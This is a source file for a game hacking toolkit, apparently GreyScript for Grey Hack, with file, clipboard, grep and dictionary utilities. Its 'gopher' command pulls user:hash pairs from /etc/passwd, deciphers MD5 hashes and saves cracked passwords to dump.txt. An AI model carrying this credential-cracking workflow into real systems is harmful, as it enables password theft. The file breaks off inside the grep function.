if DEBUG then print("<size=75%>loading dtools.5pk v 4.1.9...(153.115)</size>")

command.cob = function(arg1,arg2,arg3=0,arg4=0)
	usage_info = "<u>Cobble || custom object || cob || meta buffer</u>"+char(10)+
	colorCyan+"Usage: cob set [key] [val] -- set custom object key to val"+char(10)+
	"-- returns string on success or error"+char(10)+
	"-- create a map within the custom object by using<b> {}</b> as your val"+char(10)+
	"--eg:<b> cob set newmap {}"+char(10)+
	"-- you may set a key within an existing map with the dot reference:"+char(10)+
	"--eg:<b> cob set newmap.submap {}\n--eg:<b> cob set newmap.foo bar"+char(10)+
	"---- the map must already exist in order to add an index to the map"+char(10)+
	"-- create a new list in the custom object by using<b> []</b> as your val"+char(10)+
	"--eg:<b> cob set newlist []"+char(10)+
	"---- at this time it is not possible to add to a list in the custom object"+char(10)+
	colorCyan+"Usage: cob get [key] -- get value of custom object key"+char(10)+
	"-- returns value at key or null"+char(10)+
	"-- returns @reference (pointer) if value is a function"+char(10)+
	"-- use dot reference to retrieve nested elements of lists and maps"+char(10)+
	"--eg: cob get foo.bar"+char(10)+
	"--eg: cob get foo.bar.1 -- where 1 is index 1 of a list"+char(10)+
	colorCyan+"Usage: cob return -- returns the raw custom object"+char(10)+
	"-- pipe to command.<b>code</b> to decompile the object"+char(10)+
	"-- ie:<b> cob return | code</b>"+char(10)+
	colorCyan+"Usage: <b>cob inspect [opt:key]</b> -- returns key/value pair information of custom object"+char(10)+
	"-- returns a string pairing each key with its [truncated] value"+char(10)+
	"-- values are truncated to make the object easier to inspect"+char(10)+
	"-- please use <b>cob return | code</b> if you want the raw output"+char(10)+
	"--<b> if a key is passed and the key is a map in the custom object;"+char(10)+
	"---- cob will <b>inspect</b> that map, instead (currently only one layer)"+char(10)+
	colorCyan+"Usage: cob indexes -- return custom object indexes as a LIST"+char(10)+
	"-- pipe to the <b>string</b> command to stringify"+char(10)+
	colorCyan+"Usage: cob search [val] --  search for index of val"+char(10)+
	"-- returns string; key or failure message."+char(10)+
	"Inactive: cob sign -- future ability to sign custom object"+char(10)+
	"-- currently returns 0 (zero)"+char(10)+
	colorCyan+"Usage: cob del [key] -- delete key and its value from custom object"+char(10)+
	"-- returns string on success or failure"+char(10)+
	colorCyan+"Usage: cob <b>purge</b> -- purge the custom object"+char(10)+
	colorCyan+"Usage: cob validate -- ensure the custom_object contains indexes:"+char(10)+
	"--: macros"+char(10)+
	"--: stack_pool"+char(10)+
	"--: this avoids crashes when those indexes don't exist"+char(10)+
	"--: this is run by 5hell automatically in many cases"+char(10)+
	colorCyan+"Usage: cob install [key] -- install a function residing in the custom object at [key]"+char(10)+
	"-- this will add the function as a 5hell command (it will show up in help)"+char(10)+
	"-- functions must still follow the standard template to avoid errors"+char(10)+
	"-- the funciton will not persist after 5hell is closed"+char(10)+
	"-- please compile your custom function into 5hell.src for persistent functions"+char(10)+
	"Advanced: the "+colorGold+"cerebrum"+CT+" command loads the dictionary to the custom object"+char(10)+
	"-- it is loaded to custom_object.dictionary and can be removed by passing the 'purge' param to cerebrum"+char(10)+
	"-- this is allows you to use the dictionary between nested shell.launches with only a single run of cerebrum"+char(10)+char(10)+
	"<b>N.B.</b> -- since version 3.8.3 5hell.src contains aliases for cob set and cob get:"+char(10)+
	colorGold+"Usage: set [key] [value] -- same as cob set [key] [value]"+char(10)+
	colorGold+"Usage: get [key] -- same as cob get [key]"+char(10)+char(10)+
	colorGold+"EZclip: you may use "+colorWhite+"@o </color>[<color=white>key</color>]</b>"+char(10)+
	"-- to reference a key in the custom object"+char(10)+
	"-- the <b>@o [key]</b> will be replaced by the key's value, much like using @a, @b, @c for the clipboard"
	if @arg1 == "help" or @arg1 == "-h" then return usage_info
	if typeof(@arg1) != "string" then return "cob: invalid input: see <b>cob -h</b>"
	cobble = get_custom_object
	cob = {}
	cob.err = "cob: invalid input: see <b>cob -h"
	cob.set = function( key=0, val=0, kl="", nul=0 )
		if not @key or not @val then return null
		if @val == "{}" then val = {}
		if @val == "[]" then val = []
		if typeof(@key) == "function" then
			if typeof(@val) == "function" then
				cobble[@key] = @val
			else
				cobble[@key] = val
			end if
		else
			if typeof(@val) == "function" then
				cobble[key] = @val
			else
				cobble[key] = val
			end if
		end if
		gcout = "custom_object"
		if typeof(cobble) != gcout then gcout=gcout+"."+kl
		if cobble.hasIndex( @key ) then return "cob: set "+gcout+"."+colorGold+@key+CT+" to: "+colorGold+@val else return "cob: set error"
	end function

	cob.get = function( key=0, val=0, nil=0, nul=0 )
		if cobble.hasIndex( @key ) then return cobble[@key]
		if cobble.hasIndex( key ) then return cobble[ key ]
		return "cob: key not found"
	end function

	cob.search = function ( val=0, key=0, nil=0, nul=0 )
		if cobble.indexOf( @val ) != null then
		if typeof(@val) == "function" then return cobble.indexOf( @val )
			return cobble.indexOf( val )
		else
			if cobble.indexOf( val ) != null then return cobble.indexOf( val )
			return "cob: value not found"
		end if
	end function

	cob.return_indexes = function(key=0,val=0,nil=0,nul=0)
		return cobble.indexes
	end function
	
	cob.inspect = function( key=0, val=0, nil=0, nul=0 )
		if @key then 
			tmpc = command.cob("get",@key)
			if typeof(@tmpc) == "map" then cobble = tmpc else return "cob: cannot inspect non-list/non-map;"+char(10)+"-- instead use:<b> cob get"
		end if
		inspect_buf = []
		value_buf = []
		st = "KEY "+colorWhite+":"+CT+" [" + colorGold+"</b>"+ "TYPE" + "</color>] "+colorWhite+":"+CT+" "
		sv = "VALUE"
		inspect_buf.push(st)
		value_buf.push(sv)
		for thing in cobble 
			parsed_value = @thing.value
			if typeof(@thing.value) == "string" and thing.value.len > 32 then parsed_value = thing.value[:27]+"..."
			if typeof(@thing.value) == "list" and thing.value.len > 5 then parsed_value = thing.value[:5]+["..."]
			if typeof(@thing.value) == "map" then 
				if str(thing.value).len > 42 then parsed_value = str(thing.value)[:42]+"...}" else parsed_value = str(thing.value)
			end if
			inspect_buf.push(@thing.key + " "+colorWhite+":"+CT+" [" + colorGold+"</b>"+ typeof(@thing.value) + "</color>] "+colorWhite+":"+CT+" ")// + parsed_value)
			value_buf.push(@parsed_value)
		end for
		inspect_buf.push("[end of ")
		value_buf.push(" custom object]")
		format_buf = format_columns(inspect_buf.join(char(10)).trim)
		format_buf = format_buf.split(char(10))
		fi = 0
		if DEBUG then 
			print "debug: f_buf: "+format_buf
			print "debug: v_buf: "+value_buf
		end if 
		for line in format_buf
			format_buf[fi] = @line + @value_buf[fi]
			fi = fi + 1
		end for
		return format_buf.join(char(10))
	end function

	cob.validate = function()
		if DEBUG then print "debug: cob: validating custom object"
		o=[]
		o.push(colorCyan+"</b>cob: validating custom object...")
		if not cobble.hasIndex("macros") then; cobble.macros = {};o.push(colorOrange+"<size=75%>--: restoring index: macros");end if
		if not cobble.hasIndex("stack_pool") then; cobble.stack_pool = 0;o.push(colorOrange+"<size=75%>--: restoring index: stack_pool");end if
		if not cobble.hasIndex("HOME") then ; cobble.HOME = {"ip":"ip.add.rr.ess", "loginport":22, "rshellport":1222, "user":"root", "pass":"password", "loginprotocol":"ssh", "sharedfile":"/root/pass","database":"/root/rkit/database.csv", "t5":"/root/rkit/tables/t5", "tp":"/root/rkit/tables/tp"};end if
		// nested cobble.HOME validation needed
		return o.join(char(10))
	end function

	cob.del = function( key=0, val=0, nil=0, nul=0 )
		if typeof(@key) == "function" then
		if cobble.remove( @key ) then return "cob: removed key: <b>"+@key+"</b>" //else return "cob: key not found."
		else
		if cobble.remove( key ) then return "cob: removed key: <b>"+key+"</b>" else return "cob: key not found"
		end if
	end function

	cob.sign = function( key=0, val=0, nil=0, nul=0 )
		return cob.set( "signature" , command.code("-a", key))
	end function

	cob.install = function(key=0, val=0, nil=0, nul=0)
		g = @cob.get
		new_command = g(key)
		if typeof(@new_command) == "string" then return new_command + ": Install failed"
		if typeof(@new_command) == "function" then 
			command[key] = @new_command 
			return "Set command."+key+" to "+@new_command
		else 
			return "cob: install expects a function"
		end if
	end function

	if arg1 == "return" then return cobble
	if arg1 == "validate" then return cob.validate
	if arg1 == "install" then 
		if typeof(@arg2) == "string" then return cob.install(arg2) else return "cob: install expects a (string: key) from the custom object"
	end if

	if arg1 == "set" then
		if not @arg2 then return "cob: index cannot be zero or null"
		//if @arg3 then
			if @arg2 == "@clipa" then arg2 = @globals.CLIP["a"]
			if @arg2 == "@clipb" then arg2 = @globals.CLIP["b"]
			if @arg2 == "@clipc" then arg2 = @globals.CLIP["c"]
			if @arg3 == "@clipa" then arg3 = @globals.CLIP["a"]
			if @arg3 == "@clipb" then arg3 = @globals.CLIP["b"]
			if @arg3 == "@clipc" then arg3 = @globals.CLIP["c"]
			kl = null
			idx = @arg2
			if typeof(@arg2) == "string" then
				kl = arg2.split("\.")
				if kl.len > 1 then 
					if DEBUG then print "debug: cob is setting a nested index: "+kl
					idx = kl.pop
					kl = kl.join(".")
					tmp_c = command.cob("get",kl)
					if typeof(tmp_c) == "list" or typeof(tmp_c) == "map" then cobble = tmp_c else return "cob: target index is not a list or map"
				end if
			end if
			if typeof(cobble) == "list" and typeof(@idx) == "string" then idx = idx.to_int
			return cob.set( @idx, @arg3, kl )
		//else
		//	return "cob: invalid input: see <b>cob -h</b>"
		//end if
	end if
	if arg1 == "get" then
		if not @arg2 then return cob.err
		kl = []
		rl = []
		if typeof(@arg2) == "string" then kl = arg2.split("\.") else kl = [@arg2]
		if DEBUG then print "key list: "+kl
		for k in kl 
			g = @cob.get
			if typeof(cobble) == "list" and typeof(@k) == "string" and typeof(k.to_int) == "number" then k = k.to_int
			rl.push(g(@k))
			if typeof(@rl[-1]) == "map" or typeof(@rl[-1]) == "list" then cobble = rl[-1] else break 
		end for
		return rl[-1]
	end if

	if arg1 == "indexes" then 
		return cob.return_indexes
	end if
	if arg1 == "inspect" then
		return cob.inspect(@arg2)
	end if
	if arg1 == "sign" then return cob.sign(signature)
	if arg1 == "search" then
		if @arg2 then return cob.search( @arg2 ) else return cob.err
	end if
	if arg1 == "del" then
		if @arg2 then return cob.del( @arg2 ) else return cob.err
	end if
	if arg1 == "purge" then return command.purge("-o","y")
	return cob.err
end function
command.poke = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "<u>touch || poke || makefile || overwrite</u>"+char(10)+"Usage: poke [/path/to/file] [opt: string] -- create file in path and optionally set contents to string."+char(10)+"Usage: poke test.txt -- creates text.txt in the current path"+char(10)+"poke test.txt hello -- creates test.txt and sets content to hello"+char(10)+"Advanced: ls -la /virt | poke test.txt -- creates test.txt and pipes the output of ls -la /virt into it"+char(10)+"N.B. if file already exists then contents will be <b>overwritten</b> if string supplied."+char(10)+"n.b.b. if string is more than one word use piping to supply string."+char(10)+"<b>Advanced:</b> poke -f [path_to_existing_file] [content] -- will skip the overwrite prompt"+char(10)+"Advanced: poke -n [path] -- create path and/or set content to null."+char(10)+"-- overwrites file content with a null character."
	skip = false
	if arg1 == "-f" then 
		arg1 = arg2
		arg2 = arg3
		arg3 = arg4
		skip = true
	end if
	if arg1 == "-n" then
		if not arg2 then return "poke: -n option requires a valid path to a file."
		arg1 = arg2
		arg2 = "!!nullify!!23tqg43qg34g!!"
	end if
	destination = null
	final_name = null
	dest = globals.get_file(arg1)
	if not dest then
		split = arg1.split("/")
		if DEBUG then print("split: "+split)
		final_name = split.pop
		if DEBUG then print("final name: "+final_name)
		//if split.len and split[0] == "" then dest = globals.get_file(split.join("/")) else dest = globals.get_file(split.join("/")) /// fix it
		if split.len then dest = globals.get_file(split.join("/")) 
		if DEBUG then print("dest: ["+dest+"]")
		if not dest then
			if split.len and split[0] == "" then destination = "/" else destination = currentPath
		else
			destination = dest.path
		end if
	else
		if dest.is_folder then
			return "poke: "+arg1+" is a folder."
		else
			destination = dest.parent.path
			final_name = dest.name
		end if
	end if

	dest_folder = globals.get_file(destination)
	if not dest_folder then return("poke: destination path not found")
	if not dest_folder.has_permission("w") then return("poke: permission denied")
	try = localmachine.touch(dest_folder.path, final_name)
	if try != 1 then
		print("poke: "+try)
		// if arg2 then
		// 	if try == "The file already exists" and skip != true and user_input("overwrite contents? [Y/n] ||: ",0,1).lower == "n" then
		// 		return "aborting..."
		// 	end if
		// end if
	end if
  	dest_name = ""
	if dest_folder.path != "/" then dest_name = "/"+final_name else dest_name = final_name
	output = globals.get_file(dest_folder.path+dest_name)
	if not output then return "poke: write error"
	if arg2 and output.has_permission("w") then
    	if arg2 == "!!nullify!!23tqg43qg34g!!" then arg2 = ""
    	if output.is_binary then 
			return "poke: can't poke a binary file."
    	else
      		output.set_content(arg2)
    	end if
  	else
    	if arg2 then return "poke: permission denied."
  	end if
	return output
end function
command.merge = function(arg1, arg2, arg3=0, arg4=0)
	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "Usage: merge file_path_1 file_path_2 --  combine files. file_1 will have file_2 appended to it."
	file1 = localmachine.File(arg1)
	file2 = localmachine.File(arg2)
	if file1 and file2 then
		catch = file1.set_content( file1.get_content.trim + file2.get_content.trim )
	else
		return("Check path(s) and try again.")
	end if
	return catch
end function
command.append = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == 0 or arg1 == "-h" or arg1 == "help" then return "Usage: append [path_to_file] [text] (works best with pipe) --  add text to end of file."+char(10)+"Usage: append [file_object] [text] -- append text to file object"+char(10)+"-- pipe file object to clipa/b/c and use @a/b/c to reference"+char(10)+"-- eg: clipb @B 1 -- where BUFFER[1] is a file, then: append @b [text]"+char(10)+"Usage: append @clipa|b|c [text] -- append to the end of a clip space."+char(10)+"N.B.<b> @clipa and @clipc will append text directly with no new line. </b>"+char(10)+" -- @clipb will add a new line and then append text."
	path_to_file = arg1
	buf = arg2
	if path_to_file == "@clipa" then
		globals.CLIP["a"] = globals.CLIP["a"]+buf
		return "clipped:"+char(10)+globals.CLIP["a"]
	end if
	if path_to_file == "@clipb" then
		globals.CLIP["b"] = globals.CLIP["b"]+char(10)+buf // append treats clipb differently
		return "clipped:"+char(10)+globals.CLIP["b"]
	end if
	if path_to_file == "@clipc" then
		globals.CLIP["c"] = globals.CLIP["c"]+buf
		return "clipped:"+char(10)+globals.CLIP["c"]
	end if
  if typeof(path_to_file) == "file" then file = path_to_file
	if typeof(path_to_file) == "string" then file = globals.get_file(path_to_file)
	if not file then return "404: file not found"
	if file.get_content == "" then return file.set_content(buf)
	return file.set_content(file.get_content+char(10)+buf)
end function
command.dfit = function(arg1, arg2, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then return "Usage: dfit [path_to_file]"+char(10)+"Takes text file and splits contents by newline, joins by comma and outputs to a.csv by default."+char(10)+"As the name suggests, this is for making dictionary files. Output is a csv (comma separated values) file."
	df = null
	if arg1 then
		df = arg1
	else
		return "Usage: dfit [path_to_file]"
	end if
	dump = localmachine.File(currentPath+"/"+df)
	if not dump then
		dump = localmachine.File(df)
		if not dump then return(df+" not found.")
	end if
	P_LIST = []
	outFileName = user_input("Enter outfile name or leave blank for a.csv: "+char(10))
	if outFileName == "" or outFileName == " " then outFileName = "a.csv"
	print("Scanning...")
	lines = dump.get_content.split(char(10))
	print("Found "+lines.len+" lines. Sorting... ")
	for pw in lines
		if pw == "" then continue
		P_LIST.push(pw.trim)
	end for
	get_shell.host_computer.touch(currentPath,outFileName)
	outfile = get_shell.host_computer.File(currentPath+"/"+outFileName)
	if not outfile then return "Error: check write permissions"
	outfile.set_content(P_LIST.join(","))
	return (char(10)+"File "+outFileName+" saved. ")
end function
command.chop = function(arg1, arg2=0, arg3=0, new_name=0)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "<u><b>CHOP || DELIMITER || FILE TOOLS || clipboard tools || split"+char(10)+
	"Usage: chop [input] [index] [delimiter] [output]"+char(10)+
	colorGreen+"Usage: chop [path_to_file|@clipa|b|c] [index] [delimiter] [output_filename] -- chop a file"+char(10)+
	"<color=green>param: <color=white>path_to_file</color> -- file to chop"+char(10)+
	"-- if path_to_file is @clipa, @clipb, or @clipc it will chop the clipboard instead"+char(10)+
	"-- clipboard contents must be a string"+char(10)+
	"<color=green>param: <color=white>index</color> -- keep column of elements at index of split"+char(10)+
	"-- default: 0"+char(10)+
	"<color=green>param: <color=white>delimiter</color> -- split each line at this pattern"+char(10)+
	"-- default: char(32) aka a sapce"+char(10)+
	"-- to use char(10) as a delimiter pass ""/n"" or a piped newline for the delimiter parameter"+char(10)+
	"-- one way to pipe a newline is: <b>code -c 10 | clipa</b> -- this will place a newline in the clipboard"+char(10)+
	"---- then:<b> chop [path] [index] @a [outpath]"+char(10)+
	"<color=green>param: <color=white>output_filename</color> -- name for outfile"+char(10)+
	"-- prompts for output filename if not supplied"+char(10)+
	"-- outputs to current path with filename: output_filename "+char(10)+
	"-- output_filename may be @clipa, @clipb, or @clipc to output to clipboards instead"+char(10)+char(10)+
	"Usage Example: text to chop:"+char(10)+char(10)+
	"big bada boom"+char(10)+
	"ding dong daddy"+char(10)+
	"abracadabra"+char(10)+char(10)+
	"* and: index is 1, delimiter is: 'da'"+char(10)+
	"* the output would be:"+char(10)+char(10)+
	"boom"+char(10)+
	"ddy"+char(10)+
	"bra"+char(10)
	if DEBUG then print "debug: in chop"
	file = null
	clipping = false
	if typeof(arg1) == "string" then
		if arg1 == "@clipa" or arg1 == "@clipb" or arg1 == "@clipc" then
			clipping = true
		else
			file = globals.get_file(arg1)
			if not file then return "404: file not found"
		end if
	else
		return "chop: arg1 must be string: /path or string: @clipa/b/c"+char(10)+"clipa/b/c contents must be string."
	end if
	if not new_name then new_name = user_input("Enter output file name or press <<b>return</b>> for: "+arg1.remove("@")+".chop "+char(10)+"Enter @clipa or @clipb or @clipc to send output to clip space."+char(10)+":> ",0,0)
	if new_name == "" then new_name = arg1.remove("@")+".chop"
	new_file = null
	if new_name == "@clipa" or new_name == "@clipb" or new_name == "@clipc" then
		new_file = new_name
	else
		localmachine.touch(currentPath, new_name)
		new_file = globals.get_file(new_name)
		if not new_file then return "chop: could not write output file. access denied. check write permissions or path and try again."
	end if
	if clipping == true then
		if arg1 == "@clipa" then
			if typeof(globals.CLIP["a"]) == "string" then data = globals.CLIP["a"].replace(char(160),char(32)).split(char(10)) else return "chop: clipa contents incompatible. expects string."
		end if
		if arg1 == "@clipb" then
		  if typeof(globals.CLIP["b"]) == "string" then data = globals.CLIP["b"].replace(char(160),char(32)).split(char(10)) else return "chop: clipb contents incompatible. expects string."
		end if
		if arg1 == "@clipc" then
			if typeof(globals.CLIP["c"]) == "string" then data = globals.CLIP["c"].replace(char(160),char(32)).split(char(10)) else return "chop: clipc contents incompatible. expects string."
		end if
	else
		data = file.get_content.replace(char(160),char(32)).split(char(10))
	end if
	if DEBUG then print "debug: data: "+data
	out = []
	del = char(32)
	if arg3 then del = arg3
	if del == char(10) then del = "/n"
	if DEBUG then print "debug: del: "+del
	//print("del: "+del)
	inde = 0
	if arg2 then inde = arg2.to_int
	if typeof(inde) != "number" then inde = 0
	if del == "/n" then
		if DEBUG then print "debug: del is a newline"
		if data.hasIndex(inde) then out.push( data[inde] )
	else
		for line in data
			if line == "" then continue
			//print("Chopping "+line)
			l_split = str(line).split(del)
			i = 0
			fix = []
			for c in l_split
				if c != "" then fix.push(l_split[i])
				i = i + 1
			end for
			//print(fix)
			if fix.hasIndex(inde) then out.push(fix[inde])
		end for
	end if
	if DEBUG then print "debug: writing output"
	if typeof(new_file) == "file" then
		//print("error: "+new_file)
		print "chop: saving contents to "+colorWhite+new_file.path
		print new_file.set_content(out.join(char(10)))
		print "chop: saved:"
		return new_file.get_content
	else
		if new_file == "@clipa" then return command.clipa(out.join(char(10)))
		if new_file == "@clipb" then return command.clipb(out.join(char(10)))
		if new_file == "@clipc" then return command.clipc(out.join(char(10)))
	end if
end function
command.gopher = function(arg1, arg2, arg3=0, arg4=0) // requires crypto.so
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Gopher: decipher tool"+char(10)+"Usage: gopher [/path/to/file|file_object|hash_string|hash_list|@tbuf] -- decipher hashes using onboard dictionary or crypto.decipher."+char(10)+"-- outputs to /current_path/dump.txt"+char(10)+"-- see cerebrum for dictionary options."+char(10)+"-- gopher [/path] -- decipher contents of path"+char(10)+"-- gopher [object] -- decipher piped file object"+char(10)+"-- gopher [list] -- decipher piped list of strings"+char(10)+"-- gopher [string] -- decipher hash string (with or without preceding user: )"+char(10)+"-- gopher @tbuf -- deciphers contents of @tbuf"+char(10)+"-- tbuf is set when <b>tree</b> encounters a user:hash pair in /home or /etc/passwd"+char(10)+"-- eg: gopher user:ee11cbb19052e40b07aac0ca060c23ee or gopher ee11cbb19052e40b07aac0ca060c23ee"+char(10)+"N.B. function takes string, file_object, list. function writes to dump.txt. function returns string."+char(10)+"Advanced: gopher runs recursively on each line therefore each line of a file or list or string may:"+char(10)+"-- be a user:hash string"+char(10)+"-- be a hash string"+char(10)+"-- be a path to a file"+char(10)+"-- contain a list of the aforementioned types"
	if not globals.crypto then print( "Warning: Crypto: not found" )
	data = []
	if typeof(arg1) != "string" and typeof(arg1) != "list" and typeof(arg1) != "file" then return "gopher: invalid input: expects string, file, or list "
	if DEBUG then print("top of gopher")
	if arg1 == "@tbuf" then arg1 = globals.T_BUF // deprecated, @tbuf is now a callable variable, however this remains so that @tbuf may be used in an internal call
	if typeof(arg1) == "file" then
		if arg1.has_permission("r") then data = arg1.get_content.split(char(10)) else return "gopher: can't read "+arg1+": permission denied."
	end if
	if typeof(arg1) == "string" then
		fpath = globals.get_file(arg1)
		if fpath and typeof(fpath) == "file" then
			if DEBUG then print("gopher: found file: "+fpath.path)
			if fpath.has_permission("r") then data = fpath.get_content.split(char(10)) else return "gopher: can't read "+fpath.path+": permission denied."
		else
			if DEBUG then print("in gopher: is_string: arg1 is: "+arg1+" which is a "+typeof(arg1)+" of length: "+arg1.len)
			if arg1.len == 32 then // hash string
				data = arg1
			else 
				if arg1.indexOf(char(10)) >= 0 then 
					data = arg1.split(char(10))
				else 
					if arg1.indexOf(":") and arg1.len > 32 then data = arg1 else return "gopher: skipping invalid string"
				end if
			end if
		end if
	end if
	if typeof(arg1) == "list" then
		data = arg1 
	end if 
	if DEBUG then print("data type is: "+typeof(data))
	if typeof(data) == "list" then
		for element in data 
			if element == "" or element == " " then continue
			if DEBUG then print "debug: gopher loop is looping on element: "+char(10)+element
			if is_valid_ip(element.split("@")[0]) then 
				print "gopher: skipping ip address line" 
				continue
			end if
			wait(.1)
			print "gopher: going for it..."
			ctc = (command.gopher( element ))
			if ctc then print ctc
		end for
	end if
	if typeof(data) == "string" then 
		print("gopher: deciphering:<b> "+data)
		user = "unknown_user"
		if data.indexOf(":") then
		data = data.split(":")
		user = data[0]
		data = data[1]
		end if 
		if data.len != 32 then return "gopher: skipping invalid hash string"
		pass = command.md5("-d",data) // decipher here
		output = user + ":" + pass + ":"+data
		print("["+colorGold+user+":"+colorGold+pass+CT+":"+data+"]")
		dump = command.tree("/","dump.txt","1","n")
		if not dump then 
			command.poke("dump.txt")
			dump = globals.get_file("dump.txt")
		end if
		if dump and typeof(dump) == "file" and dump.has_permission("w") then //and dump.has_permission("r") then 
			print("gopher: saving data to "+dump.path)
			print command.append(dump,output)
		else 
			print "gopher: failed to write to dump.txt; check permissions"
		end if
	end if 
	return 0
end function
command.grep = function(a1, a2, arg3=0, arg4=0)
	find_file = false
	return_name = false
	return_path = false
	return_list = false
	globals.grepped_file = null
	if a1 and a1.lower == "-f" or a1 == "-n" or a1.lower == "-fn" or a1 == "-p" or a1.lower == "-fp" or a1 == "-a" or a1.lower == "-fa" then
		find_file = true 
		if a1 == "-n" or a1.lower == "-fn" then return_name = true
		if a1 == "-p" or a1.lower == "-fp" then return_path = true
		if a1 == "-a" or a1.lower == "-fa" then return_list = true
		if DEBUG then print "debug: grep: findfile == true"
		a1 = a2
		a2 = arg3
		if not a2 then a2 = "/"
	end if
	if not a1 then return "grep: input error"
	if a1 == "-h" or a1 == "help" then return "GREP || get regular expression || regex"+char(10)+
		colorCyan+"Usage: grep [opt:-f|-n|-p] [pattern] [opt: search_path (default: / ) | object] "+char(10)+
		"-- supports partial matches and limited regular expressions."+char(10)+char(10)+
		"Usage: grep [pattern] [search_path|object] -- grep for text in files and folders"+char(10)+
		"-- searches for text matching a given pattern"+char(10)+
		"-- returns all matching text, with line numbers and positions, found in search_path"+char(10)+
		"-- search_path may be a file, or folder, or object"+char(10)+
		"-- descends folders and files from search_path"+char(10)+
		"-- descends from <b>/</b> on object if search_path is a shell or computer object"+char(10)+
		"-- descends from path of file if search_path is a file object"+char(10)+char(10)+
		"Usage: grep [-f] [pattern] [search_path|object] -- grep for file"+char(10)+
		"-- searches search_path or piped object for a <b>file</b> with name matching pattern "+char(10)+
		"-- piped computer and shell objects will be searched from the <b>/</b> directory."+char(10)+
		"-- piped file objects will be searched from the path of the file."+char(10)+
		"-- returns a <b>file object</b> for the first match in the file tree"+char(10)+	
		"---- what coutns as a first match is still a w.i.p...."+char(10)+char(10)+
		"Usage: grep [-n|-fn] [pattern] [search_path|object] -- grep for file name"+char(10)+
		"-- searches search_path for file with name matching pattern"+char(10)+
		"-- returns the <b>file name</b> as a string"+char(10)+
		"-- uses the same search method as -f"+char(10)+
		"-- the -fn option is equivalent to the -n option"+char(10)+char(10)+
		"Usage: grep [-p|-fp] [pattern] [search_path|object] -- grep for file path"+char(10)+
		"-- searches search_path for file with name matching pattern"+char(10)+
		"-- returns the <b>file path</b> as a string"+char(10)+
		"-- uses same search method as -f"+char(10)+
		"-- -fp option is equivalent to -p option"+char(10)+char(10)+
		"Usage: grep [-a|-fa] [pattern] [path|object] -- return a <b>list of file objects</b> matching pattern"+char(10)+char(10)+
		colorCyan+"<u>current regex tokens (more planned):</u>"+char(10)+
		"c   matches any literal character 'c'"+char(10)+
		"-- bob matches bob anywhere in the text."+char(10)+
		"^   match pattern from beginning of word"+char(10)+
		"-- ^ber matches bertha  does not match robert"+char(10)+
		"$   match end of line (goes at end of pattern)"+char(10)+
		"-- .txt$ matches file.txt does not match file.txt.src"+char(10)+
		"#   matches one or more of <b>preceding</b> character"+char(10)+
		"-- c# matches c, cc, ccc, cccc "+char(10)+
		"*   matches any unicode char (wildcard)"+char(10)+
		"-- *#:*#  matches root:password, email@domain.com:password, xyz:1234"+char(10)+
		"- - - - - - - - - - - - - - - - - - - - - - - - - "+char(10)+
		"Important! Runtime depends on length of pattern and size of text to check. "+char(10)+
		"Since grep will recurse any folders in a given path, this command could result in very long run times. "+char(10)+
		"It is up to you to limit the scope of your searches accordingly."+char(10)
			
	gresult = []
	gname = null

	gp = function(grep_tar, t_f, use_re, findfile)
		//if DEBUG then print "debug: in grep; tf: "+t_f.path
		if t_f.is_folder and t_f.is_binary then
			sub_folders = t_f.get_folders
			sub_files = t_f.get_files
			g_buf = null
    		//if globals.grepped_file != null then return 
			for sub in sub_folders
				if use_re == true then
					if re.match(grep_tar.values, sub.name.values) then 
						//gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
						if sub.is_symlink then 
							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+sub.name+CT+colorLightBlue+" linked to folder in: "+ sub.parent.path + CT+char(10)+colorGold+"               |<u>"+sub.path)
						else
							gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
						end if
						if findfile == true then
							greppy.grepped.push(sub)
							//print greppy.grepped[-1].name
							print gresult[-1]
							globals.grepped_file = sub
							gname = sub.name
							if DEBUG then print "debug: found "+sub.path
							if not return_list then return
						end if
					end if
				else
					if sub.name == grep_tar or sub.name.indexOf(grep_tar) then 
						//gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path + CT)
						if sub.is_symlink then 
							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+sub.name+CT+colorLightBlue+" linked to folder in: "+ sub.parent.path + CT+char(10)+colorGold+"               |<u>"+sub.path)
							
						else 
							gresult.push(colorLightBlue+"Found folder: "+CT+colorOrange+sub.name+CT+colorLightBlue+" in: "+ sub.parent.path+CT)
							
						end if
						if findfile == true then
							greppy.grepped.push(sub)
							//print greppy.grepped[-1].name
							if DEBUG then print "debug: found "+sub.path
							print gresult[-1]
							globals.grepped_file = sub
							if not return_list then return
						end if
					end if
				end if
				gp(grep_tar, sub, use_re, findfile)
			end for
			for f in sub_files
				if use_re == true then
					if re.match(grep_tar.values, f.name.values) then 
            			//gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
						if f.is_symlink then 
							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+f.name+CT+colorLightBlue+" linked to file in: "+ f.parent.path + CT+char(10)+colorGold+"               |<u>"+f.path)
						else 
							gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
						end if
						if findfile == true then
							greppy.grepped.push(f)
							if DEBUG then print "debug: found "+f.path
							print gresult[-1]
							globals.grepped_file = f
							if not return_list then return
						end if
          			end if
				else
					if f.name == grep_tar or f.name.indexOf(grep_tar) >= 0 then 
						if f.is_symlink then 
							gresult.push(colorLightBlue+"Found symlink: "+CT+colorOrange+f.name+CT+colorLightBlue+" linked to file in: "+ f.parent.path + CT+char(10)+colorGold+"               |<u>"+f.path)
						else 
							gresult.push(colorLightBlue+"Found file: "+CT+colorOrange+f.name+CT+colorLightBlue+" in: "+ f.parent.path + CT)
						end if
						if findfile == true then
							greppy.grepped.push(f)
							if DEBUG then print "debug: found "+f.path  
							print gresult[-1]
							globals.grepped_file = f
							if not return_list then return
						end if
          			end if
				end if
